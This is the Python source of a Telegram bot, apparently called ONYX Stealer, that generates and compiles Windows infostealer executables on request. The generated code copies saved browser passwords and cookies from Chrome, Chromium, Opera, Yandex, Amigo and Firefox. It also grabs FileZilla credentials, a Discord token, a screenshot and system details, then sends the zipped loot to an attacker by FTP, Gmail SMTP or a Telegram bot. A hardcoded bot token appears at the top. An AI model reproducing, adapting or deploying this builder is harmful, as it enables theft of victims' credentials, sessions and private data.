# -*- coding: utf-8 -*-
import requests
from threading import Thread
import telebot
import os
import shutil

TOKEN = '1379176247:AAE2ET04Ob0c_3pz5IIj62_jPO7l2tiCqsA'

chat_ids_file = 'chat_ids.txt'
vip_id_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 697928972 #ваш id телеграма(цифрами)

bot = telebot.TeleBot(TOKEN)  # токен бота
types = telebot.types

user_dict = {}


class User:
    def __init__(self, log):
        self.log = log
        self.pas = ""
        self.host = ""


user_data = {}


class UserMail:
    def __init__(self, log):
        self.log = log
        self.pas = ""
        self.mail = ""


def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file, "a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
    return


def ftpstl(host, message):
    chat_id = message.chat.id
    user = user_dict[chat_id]
    f = open('ftp' + str(message.chat.id) + '.py', 'w')
    f.write('''
import os.path
import getpass
from ftplib import FTP
import random

con = FTP("''' + str(host) + '''", "''' + str(user.log) + '''", "''' + str(user.pas) + '''")

"""
Hack to directory
"""

UserName = '\\\\' + getpass.getuser()

dir_cookie_google = 'C:\\\\Users'+UserName+'\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'
dir_pass_google = "C:\\\\Users"+UserName+"\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
dir_cookie_yandex = "C:\\\\Users"+UserName+"\\\\AppData\\\\Local\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Cookies"
dir_pass_yandex = "C:\\\\Users"+UserName+"\\\\AppData\\\\Local\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Password Checker"
dir_cookie_opera = "C:\\\\Users"+UserName+"\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Cookies"
dir_pass_opera = "C:\\\\Users"+UserName+"\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Login Data"
dir_google = "C:\\\\Users"+UserName+"\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Safe Browsing Cookies"
dir_firefox = "C:\\\\Users"+UserName+"\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox"
dir_yandex = "C:\\\\Users"+UserName+"\\\\AppData\\\\Local\\\\Yandex"
dir_opera = "C:\\\\Users"+UserName+"\\\\AppData\\\\Roaming\\\\Opera Software"

def check():
   if (os.path.exists(dir_google)) == True:
       filename = "google"+str(random.randint(1, 10000))
       filename2 = "google_pass" + str(random.randint(1, 10000))
       with open(dir_cookie_google, "rb") as content:
           con.storbinary("STOR %s" % filename, content)
       with open(dir_pass_google, "rb") as content:
           con.storbinary("STOR %s" % filename2, content)
   if (os.path.exists(dir_opera)) == True:
       filename = "opera"+str(random.randint(1, 10000))
       filename2 = "opera_pass" + str(random.randint(1, 10000))
       with open(dir_cookie_opera, "rb") as content:
           con.storbinary("STOR %s" % filename, content)
       with open(dir_pass_opera, "rb") as content:
           con.storbinary("STOR %s" % filename2, content)
   if (os.path.exists(dir_yandex)) == True:
       filename = "yandex"+str(random.randint(1, 10000))
       filename2 = "yandex_pass" + str(random.randint(1, 10000))
       with open(dir_cookie_yandex, "rb") as content:
           con.storbinary("STOR %s" % filename, content)
       with open(dir_pass_yandex, "rb") as content:
           con.storbinary("STOR %s" % filename2, content)

check()
input()
''')
    f.close()
    os.system('pyinstaller --onefile --noconsole ftp' + str(message.chat.id) + '.py')
    shutil.rmtree("__pycache__")
    shutil.rmtree("build")
    os.remove("ftp" + str(message.chat.id) + ".spec")

    bot.send_message(message.chat.id, "✅Ваш файл готов!\nСкачайте его:")
    doc = open("dist/ftp" + str(message.chat.id) + ".exe", 'rb')
    bot.send_document(message.chat.id, doc)
    doc.close()

    os.remove("ftp" + str(message.chat.id) + ".py")


def mailstl(mail, message):
    chat_id = message.chat.id
    user = user_data[chat_id]
    f = open("mail" + str(message.chat.id) + ".py", "w", encoding='utf-8')
    f.write('''
import os
import sqlite3
import win32crypt
import email, ssl
import shutil
import requests
import zipfile
import getpass
import ip2geotools
import win32api
import platform
import tempfile
import smtplib
import time
import cv2
import sys
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email.message import Message
from email.mime.multipart import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from Tools.demo.mcast import sender
from os.path import basename
from smtplib import SMTP
from email.header import Header
from email.utils import parseaddr, formataddr
from base64 import encodebytes
import random


################################################################################
#                              GOOGLE PASSWORDS                                #
################################################################################
def Chrome(): 
   text = 'Passwords Chrome:' + '\\n' 
   text += 'URL | LOGIN | PASSWORD' + '\\n' 
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'): 
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data', os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data2') 
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode() 
           login = result[1]
           url = result[0]
           if password != '':
               text += url + ' | ' + login + ' | ' + password + '\\n' 
   return text
file = open(os.getenv("APPDATA") + '\\\\google_pass.txt', "w+") #создаем txt с его расположением
file.write(str(Chrome()) + '\\n')#записываем данные
file.close()

################################################################################
#                              GOOGLE Cookies                                  #
################################################################################
def Chrome_cockie():
   textc = 'Cookies Chrome:' + '\\n'
   textc += 'URL | COOKIE | COOKIE NAME' + '\\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies', os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textc += url + ' | ' + str(cookie) + ' | ' + name + '\\n'
   return textc
file = open(os.getenv("APPDATA") + '\\\\google_cookies.txt', "w+") 
file.write(str(Chrome_cockie()) + '\\n')
file.close()


################################################################################
#                              CHROMIUM PASSWORDS                              #
################################################################################
def chromium():
   textch ='Chromium Passwords:' + '\\n'
   textch += 'URL | LOGIN | PASSWORD' + '\\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Login Data', os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textch += url + ' | ' + login + ' | ' + password + '\\n'
               return textch
file = open(os.getenv("APPDATA") + '\\\\chromium.txt', "w+")
file.write(str(chromium()) + '\\n')
file.close()


################################################################################
#                              CHROMIUM cookies                                #
################################################################################
def chromiumc():
   textchc = '' 
   textchc +='Chromium Cookies:' + '\\n'
   textchc += 'URL | COOKIE | COOKIE NAME' + '\\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Cookies', os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textchc += url + ' | ' + str(cookie) + ' | ' + name + '\\n'
   return textchc
file = open(os.getenv("APPDATA") + '\\\\chromium_cookies.txt', "w+")
file.write(str(chromiumc()) + '\\n')
file.close()


################################################################################
#                              AMIGO PASSWORDS                                 #
################################################################################
def Amigo():
   textam = 'Passwords Amigo:' + '\\n'
   textam += 'URL | LOGIN | PASSWORD' + '\\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Amigo\\\\User Data\\\\Default\\\\Login Data'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Amigo\\\\User Data\\\\Default\\\\Login Data', os.getenv("LOCALAPPDATA") + '\\\\Amigo\\\\User Data\\\\Default\\\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Amigo\\\\User Data\\\\Default\\\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textam += url + ' | ' + login + ' | ' + password + '\\n'
file = open(os.getenv("APPDATA") + '\\\\amigo_pass.txt', "w+")
file.write(str(Amigo()) + '\\n')
file.close()


################################################################################
#                              AMIGO cookies                                   #
################################################################################
def Amigo_c():
   textamc = 'Cookies Amigo:' + '\\n'
   textamc += 'URL | COOKIE | COOKIE NAME' + '\\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Amigo\\\\User Data\\\\Default\\\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Amigo\\\\User Data\\\\Default\\\\Cookies', os.getenv("LOCALAPPDATA") + '\\\\Amigo\\\\User Data\\\\Default\\\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Amigo\\\\User Data\\\\Default\\\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textamc += url + ' | ' + str(cookie) + ' | ' + name + '\\n'
   return textamc
file = open(os.getenv("APPDATA") + '\\\\amigo_cookies.txt', "w+")
file.write(str(Amigo_c()) + '\\n')
file.close()


################################################################################
#                              OPERA PASSWORDS                                 #
################################################################################
def Opera():
   texto = 'Passwords Opera:' + '\\n'
   texto += 'URL | LOGIN | PASSWORD' + '\\n'
   if os.path.exists(os.getenv("APPDATA") + '\\\\Opera Software\\\\Opera Stable\\\\Login Data'):
       shutil.copy2(os.getenv("APPDATA") + '\\\\Opera Software\\\\Opera Stable\\\\Login Data', os.getenv("APPDATA") + '\\\\Opera Software\\\\Opera Stable\\\\Login Data2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\\\Opera Software\\\\Opera Stable\\\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + '\\n'
file = open(os.getenv("APPDATA") + '\\\\opera_pass.txt', "w+")
file.write(str(Opera()) + '\\n')
file.close()


################################################################################
#                              FIREFOX PASSWORDS                               #
################################################################################
def Firefox_cookies():
   texto = 'Passwords firefox:' + '\\n'
   texto += 'URL | LOGIN | PASSWORD' + '\\n'
   if os.path.exists(os.getenv("APPDATA") + '\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox'):
       shutil.copy2(os.getenv("APPDATA") + '\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox2', os.getenv("APPDATA") + '\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + '\\n'
file = open(os.getenv("APPDATA") + '\\\\firefox_pass.txt', "w+")
file.write(str(Firefox_cookies()) + '\\n')
file.close()


################################################################################
#                              YANDEX PASSWORDS                                #
################################################################################
def Yandexpass():
    textyp = 'Passwords Yandex:' + '\\n'
    textyp += 'URL | LOGIN | PASSWORD' + '\\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Ya Login Data.db'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Ya Login Data.db', os.getenv("LOCALAPPDATA") + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Ya Login Data2.db')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Yandexe\\\\YandexBrowser\\\\User Data\\\\Default\\\\Ya Login Data2.db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                textyp += url + ' | ' + login + ' | ' + password + '\\n'
    return textyp
file = open(os.getenv("APPDATA") + '\\\\yandex_passwords.txt', "w+")
file.write(str(Yandexpass()) + '\\n')
file.close()


################################################################################
#                             OPERA cookies                                    #
################################################################################
def Opera_c():
    textoc ='Cookies Opera:' + '\\n'
    textoc += 'URL | COOKIE | COOKIE NAME' + '\\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\ookies'):
      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies', os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies2')
      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies2')
      cursor = conn.cursor()
      cursor.execute("SELECT * from cookies")
      for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textoc += url + ' | ' + str(cookie) + ' | ' + name + '\\n'
    return textoc
file = open(os.getenv("APPDATA") + '\\\\opera_cookies.txt', "w+")
file.write(str(Opera_c()) + '\\n')
file.close()


################################################################################
#                             FILEZILLA                                        #
################################################################################
def filezilla():
   try:
       data = ''
       if os.path.isfile(os.getenv("APPDATA") + '\\\\FileZilla\\\\recentservers.xml') is True:
           root = etree.parse(os.getenv("APPDATA") + '\\\\FileZilla\\\\recentservers.xml').getroot()

           for i in range(len(root[0])):
               host = root[0][i][0].text
               port = root[0][i][1].text
               user = root[0][i][4].text
               password = base64.b64decode(root[0][i][5].text).decode('utf-8')
               data += 'host: ' + host + '|port: ' + port + '|user: ' + user + '|pass: ' + password + '\\n'
           return data
       else:
           return 'Not found'
   except Exception:
       return 'Error'
textfz = filezilla()
textfz += 'Filezilla: ' + '\\n' + filezilla() + '\\n'
file = open(os.getenv("APPDATA") + '\\\\filezilla.txt', "w+")
file.write(str(filezilla()) + '\\n')
file.close()

################################################################################
#                             SCREEN                                           #
################################################################################
screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\\\sreenshot.jpg')

################################################################################
#                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #
################################################################################
r = requests.get('http://ip.42.pl/raw')
IP = r.text
windows = platform.platform()
processor = platform.processor()
systemali = platform.version()
q = '\\n'
info = "PC: " + getpass.getuser() + q + "IP: " + IP + q + "OS: " + windows + q + "Processor: " + processor + q +"Version OS : " + systemali
file = open(os.getenv("APPDATA") + '\\\\INFO.txt', "w+")
file.write(str(info) + '\\n')
file.close()

################################################################################
#                              PACKING TO ZIP                                  #
################################################################################
zname = r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Local\\\\Temp\\\\LOG.zip'
NZ = zipfile.ZipFile(zname,'w')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\INFO.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\firefox_pass.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\yandex_passwords.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\google_pass.txt')
NZ.write(r'C:\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\google_cookies.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\chromium.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\chromium_cookies.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\amigo_pass.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\amigo_cookies.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\opera_pass.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\opera_cookies.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\filezilla.txt')
NZ.write(r'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Roaming\\\\sreenshot.jpg')
NZ.close() 

################################################################################
#                              ОТПРАВКА                                        #
################################################################################
'ONYX Stealer [NEW LOG] by @onyx_project with l0ve'.encode('utf-8')
msgtext = MIMEText('ONYX Stealer [NEW LOG] by @onyx_project with l0ve'.encode('utf-8'), 'plain', 'utf-8')
msg = MIMEMultipart()
msg['From'] = "''' + user.log + '''"
msg['To'] = "''' + mail + '''"
msg['Subject'] = getpass.getuser() + '-PC'
msg.attach(msgtext)

################################################################################
#                              DOC-НАШ ZIP                                     #
################################################################################
doc = 'C:\\\\Users\\\\' + getpass.getuser() + '\\\\AppData\\\\Local\\\\Temp\\\\LOG.zip'

################################################################################
#                              СОЗДАНИЕ Вложения                                #
################################################################################
part = MIMEBase('application', "zip")
b = open(doc, "rb").read()
bs = encodebytes(b).decode()
part.set_payload(bs)
part.add_header('Content-Transfer-Encoding', 'base64')
part.add_header('Content-Disposition', 'attachment; filename="LOG.zip"')
msg.attach(part)


################################################################################
#                              ОТПРАВКА ВАМ                                    #
################################################################################
s = smtplib.SMTP('smtp.gmail.com', 587)#ваш почтовый сервис,советую создавать новую гмаил
s.starttls()                                   
s.login("''' + user.log + '''", "''' + user.pas + '''")
s.sendmail("''' + user.log + '''", "''' + mail + '''", msg.as_string())
s.quit()
i = input()

''')
    f.close()
    os.system('pyinstaller --onefile --noconsole mail' + str(message.chat.id) + '.py')
    shutil.rmtree("__pycache__")
    shutil.rmtree("build")
    os.remove("mail" + str(message.chat.id) + ".spec")

    bot.send_message(message.chat.id, "✅Ваш файл готов!\nСкачайте его:")
    doc = open("dist/mail" + str(message.chat.id) + ".exe", 'rb')
    bot.send_document(message.chat.id, doc)
    doc.close()

    os.remove("mail" + str(message.chat.id) + ".py")


def tgstl(tkn, idtg, message):
    f = open("tg" + str(idtg) + ".py", "w", encoding='utf-8')
    f.write('''
import os
import sqlite3
import win32crypt
import telebot
import shutil
import requests
import zipfile
from PIL import ImageGrab
import cv2
import platform
username = os.getlogin()

token = "''' + str(tkn) + '''"
chat_id = ''' + str(idtg) + '''
bot = telebot.TeleBot(token)

q = '\\n'

def Chrome(): # Создаём функцию
   text = 'Passwords Chrome:' + q
   text += 'URL | LOGIN | PASSWORD' + q
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'): 
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data', os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data2')

       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data2') 
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               text += url + ' | ' + login + ' | ' + password + q

file = open(os.getenv("APPDATA") + '\\\\google_pass.txt', "w+")
file.write(str(Chrome()) + q)
file.close()

def Chrome_cockie():
   textc = 'Cookies Chrome:' + q
   textc += 'URL | COOKIE | COOKIE NAME' + q
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies', os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textc += url + ' | ' + str(cookie) + ' | ' + name + q
   return textc
file = open(os.getenv("APPDATA") + '\\\\google_cookies.txt', "w+") 
file.close()

def Yandex():
   texty = 'YANDEX Cookies:' + q
   texty += 'URL | COOKIE | COOKIE NAME' + q
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Cookies', os.getenv("LOCALAPPDATA") + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           texty += url + ' | ' + str(cookie) + ' | ' + name + q
   return texty
file = open(os.getenv("APPDATA") + '\\\\yandex_cookies.txt', "w+")
file.write(str(Yandex()) + q)
file.close()

def chromium():
   textch = q + 'Chromium Passwords:' + q
   textch += 'URL | LOGIN | PASSWORD' + q
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Login Data', os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Chromium\\\\User Data\\\\Default\\\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textch += url + ' | ' + login + ' | ' + password + q
               return textch
file = open(os.getenv("APPDATA") + '\\\\chromium.txt', "w+")
file.write(str(chromium()) + q)
file.close()

def Opera():
   texto = 'Passwords Opera:' + q
   texto += 'URL | LOGIN | PASSWORD' + q
   if os.path.exists(os.getenv("APPDATA") + '\\\\Opera Software\\\\Opera Stable\\\\Login Data'):
       shutil.copy2(os.getenv("APPDATA") + '\\\\Opera Software\\\\Opera Stable\\\\Login Data', os.getenv("APPDATA") + '\\\\Opera Software\\\\Opera Stable\\\\Login Data2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\\\Opera Software\\\\Opera Stable\\\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + q

file = open(os.getenv("APPDATA") + '\\\\opera_pass.txt', "w+")
file.write(str(Opera()) + q)
file.close()

def Opera_c():
    textoc = q + 'Cookies Opera:' + q
    textoc += 'URL | COOKIE | COOKIE NAME' + q
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'):
      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies', os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies2')
      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies2')
      cursor = conn.cursor()
      cursor.execute("SELECT * from cookies")
      for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textoc += url + ' | ' + str(cookie) + ' | ' + name + q
    return textoc

file = open(os.getenv("APPDATA") + '\\\\opera_cookies.txt', "w+")
file.write(str(Opera_c()) + q)
file.close()

def discord_token():
   if os.path.isfile(os.getenv("APPDATA") + '/discord/Local Storage/https_discordapp.com_0.localstorage') is True:
       token = ''
       conn = sqlite3.connect(os.getenv("APPDATA") + "/discord/Local Storage/https_discordapp.com_0.localstorage")
       cursor = conn.cursor()
       for row in cursor.execute("SELECT key, value FROM ItemTable WHERE key='token'"):
           token = row[1].decode("utf-16")
       conn.close()
       if token != '':
           return token
       else:
           return 'Discord exists, but not logged in'
   else:
       return 'Not found'
ds_token = discord_token()
ds_token += 'Discord token:' + q + discord_token() + q + q

file = open(os.getenv("APPDATA") + '\\\\discord_token.txt', "w+")
file.write(str(discord_token()) + q)
file.close()

screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\\\screenshot.jpg')

def info():    
    r = requests.get('http://ip.42.pl/raw')
    IP = r.text
    windows = platform.platform()
    processor = platform.processor()
    systemali = platform.version() 
    bot.send_message(chat_id, "PC: " + username + q + "IP: " + IP + q + "OS: " + windows + q +
        "Processor: " + processor + q +"Version OS : " + systemali)


zname=r'C:\\\\ProgramData\\\\LOG.zip'
newzip=zipfile.ZipFile(zname,'w')
newzip.write(r'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\google_pass.txt')
newzip.write(r'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\google_cookies.txt')
newzip.write(r'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\yandex_cookies.txt')
newzip.write(r'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\chromium.txt')
newzip.write(r'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\opera_pass.txt')
newzip.write(r'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\opera_cookies.txt')
newzip.write(r'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\discord_token.txt')
newzip.write(r'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\screenshot.jpg')
newzip.close()

doc = open("C:\\\\ProgramData\\\\LOG.zip", 'rb')

bot.send_document(chat_id, doc)
info()
  ''')
    f.close()
    os.system('pyinstaller --onefile --noconsole tg' + str(idtg) + '.py')
    shutil.rmtree("__pycache__")
    shutil.rmtree("build")
    os.remove("tg" + str(idtg) + ".spec")

    bot.send_message(message.chat.id, "✅Ваш файл готов!\nСкачайте его:")
    doc = open("dist/tg" + str(idtg) + ".exe", 'rb')
    bot.send_document(message.chat.id, doc)
    doc.close()

    os.remove("tg" + str(idtg) + ".py")


@bot.message_handler(commands=["start"])
def start(message):
    keyboard = types.InlineKeyboardMarkup()
    tgbot = types.InlineKeyboardButton(text='🖥Telegram Bot', callback_data="tgbot")
    ftp = types.InlineKeyboardButton(text='📡FTP', callback_data="ftp")
    mail = types.InlineKeyboardButton(text='✉️Gmail.com', callback_data="mail")
    info = types.InlineKeyboardButton(text='ℹ️Информация', callback_data="info")

    keyboard.add(tgbot)
    keyboard.add(ftp)
    keyboard.add(mail)
    keyboard.add(info)
    save_chat_id(message.chat.id)
    bot.send_message(message.chat.id, f'🖖Привет! \nЧто будем делать?', reply_markup=keyboard, parse_mode='HTML')


